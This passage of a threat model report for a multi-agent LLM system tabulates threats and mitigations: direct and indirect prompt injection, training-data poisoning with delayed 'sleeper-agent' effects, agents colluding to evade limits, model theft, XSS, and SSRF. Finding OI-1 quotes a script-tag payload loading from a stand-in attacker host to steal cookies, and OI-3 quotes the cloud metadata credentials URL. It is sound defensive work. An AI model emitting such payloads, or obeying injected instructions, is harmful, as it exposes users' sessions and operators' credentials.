| AG-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | trust_exploitation | The MCP Tool Server is vulnerable to tool call injection: an attacker who can influence the LLM output of either the Orchestrator or Specialist Agent can inject crafted JSON-RPC parameters that invoke unintended tools (tool name injection) or supply malicious arguments to permitted tools (parameter injection). The Tool Server executes these with its own service credentials. | MCP-03 | HIGH | HIGH | Critical | Implement strict tool call validation: (a) validate the tool name against a registered allowlist, (b) validate each parameter against a per-tool JSON Schema, (c) reject any request that fails validation before execution. Apply parameter encoding for values that will be forwarded to external systems (URLs, SQL fragments, shell arguments). |
| AG-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | resource_competition | The MCP Tool Server acts as a privileged execution broker. Runaway or adversarially prompted agents (Orchestrator or Specialist) can cause the Tool Server to repeatedly call External API endpoints in rapid succession, exhausting the API provider's rate limits, incurring financial costs, or triggering security lockouts that deny the system access to required external capabilities. | MCP-03 | MEDIUM | HIGH | High | Implement per-session and per-agent tool call budgets with hard rate limits enforced at the Tool Server (not just the agent). Apply per-tool circuit breakers: if a tool's error rate exceeds a threshold, temporarily disable it and alert operators. Monitor cumulative external API spend and alert on anomalous patterns. |
| AG-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop's model update mechanism, when fed adversarially crafted training signals, can be exploited for a temporal autonomy attack: the training data contains instructions that cause the updated model to expand its autonomous action scope on the next cycle, gradually accumulating capabilities it was not originally authorized to have. | ASI-01 | HIGH | HIGH | Critical | Apply capability auditing as part of every model update evaluation: before deploying an update, run the updated model through a capability regression suite that tests for unauthorized capability expansion. Enforce a strict capability allowlist (permitted tool types, action categories) that is evaluated post-update and MUST pass before production deployment of any model update. |

---

### 4.2 LLM Threats (LLM)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | OWASP Reference | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|---|
| LLM-1 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Direct prompt injection via the User→Guardrails→Orchestrator chain: an attacker embeds adversarial instructions in the user's prompt that the Guardrails Service fails to detect, causing the Orchestrator to override its system prompt, reveal internal configuration, or execute unauthorized actions. | OWASP LLM01:2025 | HIGH | HIGH | Critical | Implement multi-layer prompt injection detection: (1) Guardrails content filtering, (2) Orchestrator-level instruction boundary enforcement (treat user content as data, not instructions), (3) output validation that checks responses for system-prompt leakage patterns. Use a privilege-separated prompt architecture (system prompt in a protected zone inaccessible to user content). |
| LLM-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Indirect prompt injection via the Knowledge Base: an attacker embeds adversarial instructions in documents stored in the Knowledge Base. When the Orchestrator retrieves these documents during vector search, the adversarial instructions are injected into its context window, hijacking its reasoning. | OWASP LLM01:2025 | HIGH | HIGH | Critical | Apply retrieval-time content sanitization: strip or neutralize instruction-like patterns from retrieved documents before injection into the Orchestrator's context window. Implement a separate "content auditor" that evaluates retrieved documents for prompt injection patterns. Apply context segmentation: mark retrieved content as "untrusted data" in the context window structure so the model treats it differently from trusted instructions. |
| LLM-3 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Model theft via systematic API probing: an attacker issues carefully crafted queries to extract the Orchestrator's model behavior, fine-tuning data characteristics, or system prompt contents through systematic probing, enabling the attacker to build a functional replica of the model or extract proprietary training data. | OWASP LLM10:2025 | MEDIUM | HIGH | High | Implement query rate limiting and anomaly detection to identify systematic probing patterns (similar query structures, exhaustive parameter sweeps). Apply differential privacy to training data to limit memorization. Add output perturbation or watermarking to model responses to enable detection of model-extraction datasets. Limit response detail for queries that pattern-match against known extraction techniques. |
| LLM-4 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Training data poisoning via the Long-Running Learning Loop: the Orchestrator ingests model updates from the Learning Loop that was trained on audit log data. An attacker who pollutes the audit log with adversarial interaction records (fabricated user sessions designed to shift model behavior) poisons the Orchestrator's future behavior at update time. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Apply training data validation: audit all training data before use with anomaly detection, data-quality checks, and outlier filtering. Implement data provenance tracking — every training example must carry a verifiable source signature. Apply adversarial training detection: scan for data patterns designed to shift model outputs toward specific adversarial objectives. |
| LLM-5 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — client-side XSS via the Orchestrator's HTTPS response to the User: LLM-generated response content rendered as HTML in the user's browser without contextual output encoding enables stored or reflected XSS. An attacker who primes the Orchestrator (via prompt injection or RAG poisoning) to emit `<script>` or event-handler payloads causes client-side execution under the application's origin with access to session cookies and CSRF tokens. Execution context is **client-side**: the payload runs in the victim user's browser. | OWASP LLM05:2025 | HIGH | HIGH | Critical | Apply HTML entity encoding on all LLM output before browser rendering. Use framework-native safe rendering APIs (React `{value}` not `dangerouslySetInnerHTML`, Django auto-escape `{{ value }}` not `{{ value\|safe }}`). Layer a strict Content Security Policy (`default-src 'self'`; `script-src 'self' 'nonce-<nonce>'`; no `unsafe-inline` / `unsafe-eval`). Do NOT rely on post-hoc string sanitization as the primary control. |
| LLM-6 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — server-side execution via Tool Call Request: LLM-generated JSON-RPC parameters flowing into the MCP Tool Server may contain injection payloads (SQL fragments, shell metacharacters) that are executed server-side when the Tool Server dispatches tool invocations. Execution context is **server-side**: the payload runs on the Tool Server with its service account credentials and external API access. | OWASP LLM05:2025 | HIGH | HIGH | Critical | The MCP Tool Server MUST validate and parameterize all LLM-supplied tool arguments before execution: use parameterized queries for database tools, argument vectors (not shell interpolation) for command tools, and URL allowlisting for HTTP tools. Never pass LLM output directly to an execution sink — treat it as untrusted input at every downstream execution point. |
| LLM-7 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — SSRF via LLM-synthesized URL: the Orchestrator can instruct the MCP Tool Server to fetch external URLs synthesized from LLM output. An attacker who influences the Orchestrator's output can cause it to emit internal service URLs (cloud metadata endpoints, internal admin APIs) as tool parameters. The Tool Server fetches these with its server-side network credentials. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role. | OWASP LLM05:2025 | MEDIUM | HIGH | High | Implement URL allowlisting on all outbound HTTP tool invocations in the MCP Tool Server. Reject any URL not matching an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges, link-local, and cloud metadata endpoints via egress firewall. Validate URL scheme against `{http, https}` only. Apply DNS pinning. |
| LLM-8 | [UNCHANGED] | Specialist Agent | Unclassified | — | Prompt injection via delegation messages: the Specialist Agent processes tasks delegated by the Orchestrator via the Inter-Agent Channel. An attacker who injects adversarial content into the Delegation Message (via channel tampering or Orchestrator compromise) can hijack the Specialist's task execution, causing it to perform unauthorized tool invocations or exfiltrate data through its result channel. | OWASP LLM01:2025 | HIGH | HIGH | Critical | Apply prompt injection detection at the Specialist Agent's input processing layer: treat all delegation message content as untrusted data, not instructions. Implement instruction boundary enforcement: the Specialist's system prompt must be in a protected zone inaccessible to delegation message content. Verify delegation message signatures before processing. |
| LLM-9 | [UNCHANGED] | Specialist Agent | Unclassified | — | Training data poisoning of the Specialist Agent via the Learning Loop: adversarially crafted audit log entries from the Specialist's own decision logs (self-poisoning) can be incorporated into the Learning Loop's training signal and returned as a model update that shifts the Specialist's behavior toward attacker-preferred outputs. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Apply the same training data provenance and anomaly detection controls as LLM-4. Additionally: implement agent-specific behavioral baselining — compare the Specialist's pre/post-update behavior against its baseline on a held-out evaluation set before deploying any update. |
| LLM-10 | [UNCHANGED] | Specialist Agent | Unclassified | — | Improper output handling — server-side injection via tool call results: the Specialist Agent's tool call results from MCP Tool Server are incorporated into its context and may influence downstream tool invocations. If the Tool Server returns LLM-influenced content that contains injection payloads, the Specialist's next tool call may forward those payloads to execution sinks. Execution context is **server-side**. | OWASP LLM05:2025 | MEDIUM | HIGH | High | Implement output sanitization on all tool results before incorporating them into the Specialist's context window for subsequent tool invocations. Treat tool results as untrusted data inputs — never interpolate them directly into subsequent tool call parameters without validation. Apply allowlist-based parameter validation at the Tool Server for all tool inputs regardless of source. |
| LLM-11 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | Data poisoning of the Learning Loop's training signal: the audit log training stream is the Learning Loop's primary data source. An attacker who systematically injects adversarially crafted interaction records into the Audit Logger creates poisoned training data that shifts the updated models' behavior over the training cycle — a temporal data poisoning attack with delayed activation at the next model update. | OWASP LLM03:2025 | HIGH | HIGH | Critical | Implement training data integrity controls: (a) cryptographic signing of each audit log batch, (b) anomaly detection on training signal distributions (outlier detection, behavioral drift analysis), (c) holdout evaluation before deploying any update, (d) differential privacy during training to limit per-example influence. Apply a human-review gate on model updates that show significant behavioral deviation from the prior version. |
| LLM-12 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | Model theft via Learning Loop output monitoring: an attacker with observability access to the Learning Loop's model update artifacts (parameter diffs, update packages) can reconstruct the model's architecture, parameters, or training data characteristics — effectively stealing the proprietary model. | OWASP LLM10:2025 | MEDIUM | HIGH | High | Encrypt model update packages end-to-end: the Learning Loop MUST encrypt model artifacts before emission; the Orchestrator and Specialist decrypt using HSM-managed keys. Apply model watermarking to enable theft detection. Restrict access to model update artifacts to authorized deployment services only. |

**OI Findings (Output Integrity — OWASP LLM05:2025)**:

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | OWASP Reference | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|---|
| OI-1 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — client-side XSS via LLM response rendered in user browser: the Orchestrator's "Response (HTTPS)" data flow sends LLM-generated content directly to the User. If the client-side rendering layer injects this content into the DOM via `innerHTML` or equivalent without HTML entity encoding, an attacker who primes the Orchestrator to emit `<script src="//evil.example/steal.js">` or an event-handler payload causes **client-side execution** in the victim's browser under the application's origin, with access to session cookies, CSRF tokens, and downstream user-authenticated APIs. This is a direct output-sink path: LLM Process → `Response (HTTPS)` → User browser render surface. FR-011 two-part gate confirmed: (1) LLM keyword on LLM Agent Orchestrator, (2) `Response (HTTPS)` data flow into User (browser render surface = client-side execution sink). | OWASP LLM05:2025 | HIGH | HIGH | Critical | Use `textContent` (not `innerHTML`) for all LLM response insertion into the DOM. If HTML rendering is required, pass model output through a strict HTML sanitization library (DOMPurify configured with `FORCE_BODY: true`, allowlist elements only). Deploy a Content Security Policy with `script-src 'self' 'nonce-<nonce>'` and no `unsafe-inline`. Do NOT rely on server-side filtering alone — apply encoding at each render point independently. |
| OI-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — server-side execution via Tool Call Request: the Orchestrator emits "Tool Call Request (JSON-RPC)" messages to the MCP Tool Server containing LLM-synthesized parameters. If tool parameters are used to construct SQL queries, shell commands, template expressions, or filesystem paths server-side without parameterization or sanitization, an attacker who influences the Orchestrator's output achieves **server-side code/command execution** via the tool execution sink. Execution context: Tool Server backend, with service account credentials and External API access. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server = server-side execution sink. | OWASP LLM05:2025 | HIGH | HIGH | Critical | MCP Tool Server MUST parameterize all LLM-supplied inputs: use `cursor.execute(sql, params)` (not string interpolation) for SQL tools; `subprocess.run([cmd, arg1], shell=False)` for command tools; validate against a closed allowlist for enumerable parameters (tool names, resource identifiers). Implement a JSON Schema validator at the Tool Server ingress that rejects any request failing parameter type/format constraints before dispatch. |
| OI-3 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Improper output handling — SSRF via LLM-synthesized URL in Tool Call Request: the Orchestrator constructs "Tool Call Request (JSON-RPC)" messages containing URLs sourced from LLM output (e.g., "fetch this URL" tool calls). The MCP Tool Server executes outbound HTTP to the supplied URL using its own server-side network credentials and IAM role. An attacker who influences the Orchestrator's output can cause it to emit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or RFC 1918 internal service URLs. Execution context is **server-side**: the HTTP client runs with the Tool Server's IAM role and internal network reach. FR-011 gate confirmed: (1) LLM keyword on Orchestrator, (2) Tool Call Request (JSON-RPC) → MCP Tool Server → External API (HTTP fetch) = SSRF-capable server-side execution sink. | OWASP LLM05:2025 | MEDIUM | HIGH | High | Implement URL allowlisting on the MCP Tool Server for all outbound HTTP tool invocations: reject any URL not in an explicit allowlist of permitted external hostnames. Block egress to RFC 1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), link-local (`169.254.0.0/16`), and cloud metadata endpoints via egress firewall rules. Validate URL scheme to `{http, https}` only. Apply DNS pinning (resolve once, verify IP is not private before dispatch). |

---

*Note: LLM-5, LLM-6, and LLM-7 (covering output integrity within the LLM threat table) are complementary to OI-1, OI-2, and OI-3 (the dedicated output-integrity agent findings). LLM-5/6/7 were produced by the LLM agents (prompt-injection, data-poisoning, model-theft context) while OI-1/2/3 were produced by the dedicated output-integrity agent with full pattern catalog application. These findings are distinct in scope detail; both sets are retained per the output-integrity agent's dual-trigger confirmation.*

**Source Attribution for OI findings** (F-A2 contract):

```yaml
OI-1:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-79
      relationship: related

OI-2:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-89
      relationship: related
    - taxonomy: cwe
      id: CWE-78
      relationship: related

OI-3:
  source_attribution:
    - taxonomy: owasp
      id: LLM05
      relationship: primary
    - taxonomy: cwe
      id: CWE-918
      relationship: related
```

---

## 4a. Correlated Findings

Correlation detection rules applied (CR-1 through CR-5):

- **CR-1** (T + LLM/data-poisoning): LLM Agent Orchestrator → T-2 + LLM-4 → CG-1
- **CR-1** (T + LLM/data-poisoning): Long-Running Learning Loop → T-8 + LLM-11 → CG-2
- **CR-2** (E + AG/agent-autonomy): LLM Agent Orchestrator → E-2 + AG-1 → CG-3
- **CR-3** (I + LLM/prompt-injection): LLM Agent Orchestrator → I-2 + LLM-1 → CG-4
- **CR-4** (R + AG/agent-autonomy): LLM Agent Orchestrator → R-3 + AG-1 (AG-1 already in CG-3; merge) → CG-3 extended
- **CR-5** (D + AG/tool-abuse): MCP Tool Server → D-5 + AG-6 → CG-5

| Group | Findings | Component | Threat Summary | Risk Level |
|---|---|---|---|---|
| CG-1 | T-2, LLM-4 | LLM Agent Orchestrator | Tampering: Context window manipulation via upstream data source tampering; Data-Poisoning: Training data poisoning of Orchestrator via Learning Loop's audit-fed update cycle | Critical |
| CG-2 | T-8, LLM-11 | Long-Running Learning Loop | Tampering: Temporal data poisoning of training signal stream with sleeper-agent injection; LLM Data-Poisoning: Systematic audit log poisoning for delayed model behavioral shift | Critical |
| CG-3 | E-2, R-3, AG-1 | LLM Agent Orchestrator | Privilege-Escalation: Prompt injection self-authorizing elevated operations; Repudiation: Inability to attribute Orchestrator actions; Agent-Autonomy: Unauthorized autonomous high-impact action execution | Critical |
| CG-4 | I-2, LLM-1 | LLM Agent Orchestrator | Info-Disclosure: Context window leakage via hallucination or injection; Prompt-Injection: Direct injection overriding system prompt | Critical |
| CG-5 | D-5, AG-6 | MCP Tool Server | Denial-of-Service: Connection pool exhaustion via high-volume tool requests; Tool-Abuse: Agent-driven API rate limit exhaustion and runaway tool invocation | Critical |

---

## 4b. Findings by Agentic Pattern

**Multi-agent gate predicate evaluation**:
- Condition (a): ≥2 agentic/LLM components — TRUE (Orchestrator, Specialist, Channel, ToolServer, Learning Loop = 5 components)
- Condition (b): Inter-agent data flow between two agentic components — TRUE (Orchestrator↔Channel↔Specialist)
- Condition (c): Explicit multi-agent keyword — TRUE ("supervisor-plus-specialist delegation topology", "multi-agent" in architecture description)
- **Predicate result: TRUE**

| Pattern | Count | Findings |
|---|---|---|
| trust_exploitation | 8 | S-1, S-3, S-4, S-5, S-6, AG-3, AG-4, AG-5 |
| temporal_attack | 7 | T-8, S-7, R-7, E-6, LLM-11, LLM-12, AG-7 |
| resource_competition | 5 | D-2, D-3, D-4, D-5, AG-6 |
| agent_collusion | 1 | AG-2 |
| communication_vulnerability | 2 | T-4, I-4 |
| emergent_behavior | 1 | AGP-01 |

---

## 5. Coverage Matrix

| Component | S | T | R | I | D | E | AG | LLM | Total (dedup) |
|---|---|---|---|---|---|---|---|---|---|
| User | 1 | n/a | 1 | n/a | n/a | n/a | n/a | n/a | 2 |
| Guardrails Service | 1 | 1 | 1 | 1 | 1 | 1 | n/a | n/a | 6 |
| LLM Agent Orchestrator | 1 | 1 | 1 | 1 | 1 | 1 | 3 | 10 | 19 |
| Specialist Agent | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 3 | 10 |
| Inter-Agent Communication Channel | 1 | 1 | 1 | 1 | 1 | 1 | 2 | n/a | 8 |
| MCP Tool Server | 1 | 1 | 1 | 1 | 1 | 1 | 2 | n/a | 8 |
| Knowledge Base | n/a | 1 | n/a | 1 | 1 | n/a | n/a | n/a | 3 |
| Audit Logger | n/a | 1 | n/a | 1 | 1 | n/a | n/a | n/a | 3 |
| Long-Running Learning Loop | 1 | 1 | 1 | 1 | 1 | 1 | 1 | 2 | 9 |
| External API | 1 | n/a | 1 | n/a | n/a | n/a | n/a | n/a | 2 |
| **Total** | **8** | **8** | **8** | **8** | **8** | **6** | **9** | **15** | **70** |

Counts reflect deduplicated findings per correlation group rules. 5 correlation groups merge 12 individual findings.

### 5a. Coverage Gate Results

| Component | Coverage Type | Required Categories | Evaluated | Status |
|---|---|---|---|---|
| User | external_entity | spoofing, repudiation | spoofing ✓, repudiation ✓ | PASS |
| Guardrails Service | process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation | all ✓ | PASS |
| LLM Agent Orchestrator | llm_process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, llm, output-integrity | all ✓ | PASS |
| Specialist Agent | llm_process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, llm | all ✓ | PASS |
| Inter-Agent Communication Channel | mcp_server | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, agentic | all ✓ | PASS |
| MCP Tool Server | mcp_server | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, agentic | all ✓ | PASS |
| Knowledge Base | data_store | tampering, info-disclosure, denial-of-service | all ✓ | PASS |
| Audit Logger | data_store | tampering, info-disclosure, denial-of-service | all ✓ | PASS |
| Long-Running Learning Loop | llm_process | spoofing, tampering, repudiation, info-disclosure, denial-of-service, privilege-escalation, llm | all ✓ | PASS |
| External API | external_entity | spoofing, repudiation | all ✓ | PASS |

**Coverage Gate: PASS** — no gaps detected.

---

## 6. Risk Summary

### Risk Calibration Matrix

|                  | LOW Likelihood | MEDIUM Likelihood | HIGH Likelihood |
|------------------|----------------|-------------------|-----------------|
| **HIGH Impact**  | Medium         | High              | Critical        |
| **MEDIUM Impact**| Low            | Medium            | High            |
| **LOW Impact**   | Note           | Low               | Medium          |

### Risk by MAESTRO Layer

| MAESTRO Layer | Finding Count | Highest Severity |
|---|---|---|
| L1 — Foundation Model | 22 | Critical |
| Unclassified | 24 | Critical |
| L6 — Security and Compliance | 8 | Critical |
| L3 — Agent Framework | 6 | Critical |
| L2 — Data Operations | 3 | High |
| L5 — Evaluation and Observability | 3 | High |
| L7 — Agent Ecosystem | 2 | Critical |

### Risk Distribution (Raw Findings)

| Risk Level | Count | Percentage |
|---|---|---|
| Critical | 44 | 62.9% |
| High | 22 | 31.4% |
| Medium | 4 | 5.7% |
| Low | 0 | 0.0% |
| Note | 0 | 0.0% |
| **Total** | **70** | **100%** |

*Deduplicated total (correlation groups applied): 5 groups merge 12 findings into 5 → deduplicated total: 63 unique threats at group risk levels.*

---

## 7. Recommended Actions

Sorted by risk level descending, then by table appearance order:

| Finding ID | Status | Component | Threat | Risk Level | Mitigation |
|---|---|---|---|---|---|
| S-1 | [UNCHANGED] | User | Attacker impersonates legitimate user via replayed session tokens | Critical | Implement short-lived JWT tokens with MFA, token revocation lists |
| S-3 | [UNCHANGED] | LLM Agent Orchestrator | Orchestrator identity not attested to Specialist; rogue process can inject delegation instructions | Critical | Authenticate Orchestrator→Channel messages via HMAC/asymmetric signing |
| S-5 | [UNCHANGED] | Inter-Agent Communication Channel | Shared channel with no sender authentication; malicious process can inject impersonated messages | Critical | Implement per-message digital signatures on all channel messages |
| S-6 | [UNCHANGED] | MCP Tool Server | Application Zone process spoofs agent identity to submit unauthorized tool calls | Critical | Enforce caller authentication on all JSON-RPC endpoints via mTLS |
| S-7 | [UNCHANGED] | Long-Running Learning Loop | Training signal accepted without source integrity verification | Critical | Cryptographically sign training signal batches; verify before ingestion |
| T-2 | [UNCHANGED] | LLM Agent Orchestrator | Context window tampered via upstream data source compromise | Critical | Validate integrity of all context sources; hash retrieved documents |
| T-3 | [UNCHANGED] | Specialist Agent | Delegation message context tampered via Inter-Agent Channel injection | Critical | Validate and HMAC-verify all delegation message payloads |
| T-4 | [UNCHANGED] | Inter-Agent Communication Channel | Messages modified in transit by agent-in-the-middle | Critical | End-to-end digital signatures at message layer; replay detection |
| T-5 | [UNCHANGED] | MCP Tool Server | LLM-generated tool parameters bypass allowlist; shell/SQL injection via JSON-RPC | Critical | Strict parameter validation against per-tool JSON Schema; reject metacharacters |
| T-8 | [UNCHANGED] | Long-Running Learning Loop | Training signal poisoning with temporal/sleeper-agent injection | Critical | Training data provenance attestation; anomaly detection on distributions |
| R-3 | [UNCHANGED] | LLM Agent Orchestrator | Orchestrator denies having issued delegation/tool actions without content-hash log | Critical | Log every Orchestrator action with content hash and service key signature |
| I-2 | [UNCHANGED] | LLM Agent Orchestrator | Context window leaked in response via hallucination/injection | Critical | Implement output scrubbing before HTTPS response transmission |
| I-4 | [UNCHANGED] | Inter-Agent Communication Channel | Inter-agent messages observable to unauthorized Application Zone processes | Critical | End-to-end per-message encryption between agents; access control on channel |
| I-7 | [UNCHANGED] | Audit Logger | Unauthorized read access exposes full operational history of agent system | Critical | Strict read access controls; encrypt at-rest with envelope encryption |
| D-1 | [UNCHANGED] | Guardrails Service | Resource exhaustion via high-volume computationally-expensive prompt submission | Critical | Per-IP/session rate limiting before Guardrails; computational budget per prompt |
| D-2 | [UNCHANGED] | LLM Agent Orchestrator | Inference pipeline exhaustion via high-token prompts or recursive tool chains | Critical | Per-session token budgets; circuit breakers on tool chains; load shedding |
| D-5 | [UNCHANGED] | MCP Tool Server | Connection pool exhaustion via high-volume tool call requests | Critical | Per-caller/tool rate limiting; connection pool overflow rejection; circuit breakers |
| E-1 | [UNCHANGED] | Guardrails Service | Prompt injection bypass elevates attacker to trusted Orchestrator caller | Critical | Defense-in-depth: Orchestrator applies independent input validation |
| E-2 | [UNCHANGED] | LLM Agent Orchestrator | Prompt injection self-authorizes elevated operations (full KB export, cross-scope tools) | Critical | Per-session scoped permissions enforced by downstream services independently |
| E-4 | [UNCHANGED] | Inter-Agent Communication Channel | Application Zone process injects messages with forged elevated sender identity | Critical | Enforce sender identity authentication at Channel; reject unverified messages |
| E-5 | [UNCHANGED] | MCP Tool Server | Unauthorized tool calls gain Tool Server execution privileges and credential set | Critical | Zero-trust authorization at Tool Server; per-tool least-privilege service accounts |
| E-6 | [UNCHANGED] | Long-Running Learning Loop | Poisoned update escalates attacker from data access to model parameter control | Critical | Signed model updates via HSM; staged rollout with capability regression |
| AG-1 | [UNCHANGED] | LLM Agent Orchestrator | Prompt injection causes autonomous unauthorized high-impact actions | Critical | Scope-enforcement layer; human-in-the-loop for high-impact operations |
| AG-2 | [UNCHANGED] | LLM Agent Orchestrator | Orchestrator+Specialist coordinate for policy circumvention above per-agent limits | Critical | Cross-agent rate limits; combined action sequence policy engine |
| AG-3 | [UNCHANGED] | Specialist Agent | Adversarial delegation causes autonomous prohibited cumulative tool call sequence | Critical | Task-level intent verification; tool call budget per task |
| AG-4 | [UNCHANGED] | Inter-Agent Communication Channel | Agent-in-the-middle intercepts and modifies delegation messages | Critical | End-to-end message authentication; replay detection |
| AG-5 | [UNCHANGED] | MCP Tool Server | Tool call injection via LLM-influenced JSON-RPC parameters | Critical | Registered tool allowlist; per-tool parameter JSON Schema validation |
| AG-7 | [UNCHANGED] | Long-Running Learning Loop | Training data causes model to expand autonomous action scope on next update | Critical | Capability auditing in update evaluation; capability allowlist enforced post-update |
| LLM-1 | [UNCHANGED] | LLM Agent Orchestrator | Direct prompt injection overrides system prompt or reveals configuration | Critical | Multi-layer injection detection; privilege-separated prompt architecture |
| LLM-2 | [UNCHANGED] | LLM Agent Orchestrator | Indirect prompt injection via adversarial KB documents | Critical | Retrieval-time content sanitization; context segmentation marking |
| LLM-4 | [UNCHANGED] | LLM Agent Orchestrator | Training data poisoning via Audit Logger-fed Learning Loop update | Critical | Training data validation; provenance tracking; adversarial training detection |
| LLM-5 | [UNCHANGED] | LLM Agent Orchestrator | Client-side XSS via LLM response rendered in browser (client-side execution) | Critical | HTML entity encoding; textContent not innerHTML; strict CSP |
| LLM-6 | [UNCHANGED] | LLM Agent Orchestrator | Server-side execution via tool call parameters (SQLi/command injection) | Critical | Parameterized queries; argument vector commands; closed allowlists |
| LLM-8 | [UNCHANGED] | Specialist Agent | Prompt injection via adversarial delegation messages hijacks task execution | Critical | Instruction boundary enforcement at Specialist; delegation signature verification |
| LLM-9 | [UNCHANGED] | Specialist Agent | Training data poisoning via Specialist's own decision log self-poisoning loop | Critical | Provenance attestation; Specialist-specific behavioral baselining pre-deploy |
| LLM-11 | [UNCHANGED] | Long-Running Learning Loop | Systematic audit log poisoning for delayed temporal model behavioral shift | Critical | Cryptographic log signing; anomaly detection; differential privacy training |
| OI-1 | [UNCHANGED] | LLM Agent Orchestrator | Client-side XSS via LLM response to User browser (client-side execution) | Critical | textContent not innerHTML; DOMPurify with allowlist; strict CSP nonce |
| OI-2 | [UNCHANGED] | LLM Agent Orchestrator | Server-side code/command execution via LLM-synthesized Tool Call Request parameters | Critical | MCP Tool Server parameter validation: SQL parameterization, argument vectors, allowlists |
| S-2 | [UNCHANGED] | Guardrails Service | Direct bypass to Orchestrator internal endpoint without Guardrails | High | Enforce mTLS between Guardrails and Orchestrator; SPIFFE/SPIRE identity |
| S-4 | [UNCHANGED] | Specialist Agent | Specialist impersonates Orchestrator to inject fabricated aggregated results | High | Sign Specialist→Channel messages; Orchestrator verifies result origin |
| S-8 | [UNCHANGED] | External API | DNS hijacking/BGP attack redirects External API calls to attacker-controlled server | High | Certificate pinning on outbound HTTPS; HSTS preload |
| T-1 | [UNCHANGED] | Guardrails Service | Filtering rule modification to allow blocked prompt patterns | High | Configuration-as-code with commit signing; dual approval for rule changes |
| T-6 | [UNCHANGED] | Knowledge Base | KB corpus poisoning via unauthorized write access | High | Write access controls; per-document integrity checks; corpus scanning |
| T-7 | [UNCHANGED] | Audit Logger | Audit log tampering destroys training signal integrity and forensic evidence | High | Append-only store; Merkle hash chain; external immutable hash store |
| R-4 | [UNCHANGED] | Specialist Agent | Specialist denies executed tool calls or produced specific results | High | Log all Specialist actions with content hashes and service key signatures |
| R-6 | [UNCHANGED] | MCP Tool Server | Tool Server denies having executed specific tool invocation | High | Log all JSON-RPC invocations with caller identity and parameters before execution |
| R-7 | [UNCHANGED] | Long-Running Learning Loop | Learning Loop denies having applied specific model update | High | Log model update events with training data hash and parameter diff hash |
| I-3 | [UNCHANGED] | Specialist Agent | Sensitive delegation context leaked in Specialist results via channel or logs | High | Data minimization in delegation messages; output scrubbing on Specialist results |
| I-5 | [UNCHANGED] | MCP Tool Server | Tool results containing PII logged verbatim to Audit Logger | High | Field-level classification in structured logging; hash/tokenize PII before logging |
| I-6 | [UNCHANGED] | Knowledge Base | Full corpus exfiltration via unrestricted vector search queries | High | Per-session result limits; query rate limits; context-aware authorization |
| I-8 | [UNCHANGED] | Long-Running Learning Loop | Model memorizes training data PII; training data extraction attack | High | Differential privacy during training; de-identification of training signals |
| D-3 | [UNCHANGED] | Specialist Agent | Computationally expensive delegated tasks exhaust Specialist capacity | High | Per-task time/resource limits; task queue depth limits; backpressure from Orchestrator |
| D-4 | [UNCHANGED] | Inter-Agent Communication Channel | Message queue flooding drops legitimate coordination messages | High | Queue depth limits; per-sender rate limits; backpressure on overflow |
| D-7 | [UNCHANGED] | Audit Logger | Log-flooding attack creates audit gaps and blocks pipeline operations | High | Asynchronous write queues; write rate limits per source; log rotation management |
| E-3 | [UNCHANGED] | Specialist Agent | Forged delegation grants Specialist elevated permissions beyond session scope | High | MCP Tool Server validates Specialist's claimed scope against session authorization record |
| AG-6 | [UNCHANGED] | MCP Tool Server | Runaway agent-driven tool calls exhaust External API rate limits and connection pool | High | Per-session/agent tool call budgets; per-tool circuit breakers; spend monitoring |
| LLM-3 | [UNCHANGED] | LLM Agent Orchestrator | Model theft via systematic API probing and behavior extraction | High | Query rate limiting; anomaly detection for probing patterns; output watermarking |
| LLM-7 | [UNCHANGED] | LLM Agent Orchestrator | SSRF via LLM-synthesized URL in Tool Call Request (server-side network access) | High | URL allowlisting; egress firewall; DNS pinning; scheme validation |
| LLM-10 | [UNCHANGED] | Specialist Agent | Server-side injection via tool result incorporation into subsequent tool calls | High | Sanitize tool results before context injection; allowlist-based parameter validation |
| LLM-12 | [UNCHANGED] | Long-Running Learning Loop | Model theft via Learning Loop output artifact monitoring | High | Encrypt model update packages; model watermarking; restrict artifact access |
| OI-3 | [UNCHANGED] | LLM Agent Orchestrator | SSRF via LLM-synthesized URL in Tool Call Request to MCP Tool Server (server-side) | High | URL allowlisting; egress firewall blocking RFC 1918/metadata; DNS pinning |
